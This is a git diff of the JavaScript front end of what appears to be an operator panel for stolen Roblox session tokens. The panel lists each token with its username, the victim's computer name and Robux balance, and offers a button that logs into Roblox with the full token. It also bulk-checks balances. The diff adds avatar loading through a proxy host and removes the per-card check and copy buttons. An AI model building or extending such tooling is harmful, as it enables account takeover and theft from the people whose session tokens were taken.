@@ -78,7 +78,11 @@ function renderTokens() {
       html += '<div class="token-card-robux" style="background: rgba(255,255,255,0.05); color: var(--text-muted); border-color: transparent; box-shadow: none;">0 R$</div>';
     }
     
-    html += '<div class="token-card-avatar">👤</div>';
+    let avatarHtml = '<div class="token-card-avatar">👤</div>';
+    if (t.userId) {
+      avatarHtml = '<div class="token-card-avatar" style="padding:0; overflow:hidden;"><img src="https://filetransfer.arte-inc.ru/avatar-proxy/' + t.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\\\'👤\\\'"></div>';
+    }
+    html += avatarHtml;
     html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';
     html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';
     
@@ -95,12 +99,8 @@ function renderTokens() {
     
     if (t.security) {
       html += '<button class="' + loginClass + '" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
-      html += '<div style="display:flex; gap:8px;">';
-      html += '<button class="btn-secondary" style="flex:1; color: var(--warning); border-color: rgba(245,158,11,0.25); background: rgba(245,158,11,0.05);" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')">Проверить</button>';
-      html += '<button class="btn-secondary" style="flex:1;" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')">Копировать</button>';
-      html += '</div>';
     } else {
-      html += '<button class="btn-secondary" style="width:100%; color: var(--warning); border-color: rgba(245,158,11,0.25); background: rgba(245,158,11,0.05);" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')">Проверить</button>';
+      // no login button if no security token
     }
     
     html += '</div></div>';
@@ -141,7 +141,7 @@ async function checkSingle(filename) {
 document.getElementById('btnCheckAll').addEventListener('click', async function() {
   const btn = this;
   btn.disabled = true;
-  btn.textContent = '⏳ Проверка...';
+  btn.innerHTML = '<span style="font-size: 1.2rem;">⏳</span> Проверка...';
   try {
     const r = await apiFetch('/robux-bulk', { method: 'POST' });
     const results = await r.json();
@@ -156,7 +156,7 @@ document.getElementById('btnCheckAll').addEventListener('click', async function(
     if (e.message !== 'auth') toast('Ошибка проверки', 'err');
   }
   btn.disabled = false;
-  btn.textContent = '✓ Проверить все';
+  btn.innerHTML = '<span style="font-size: 1.2rem;">⟳</span> Проверить все';
 });
 
 // ── Копирование ───────────────────────────────────────────────────────────────
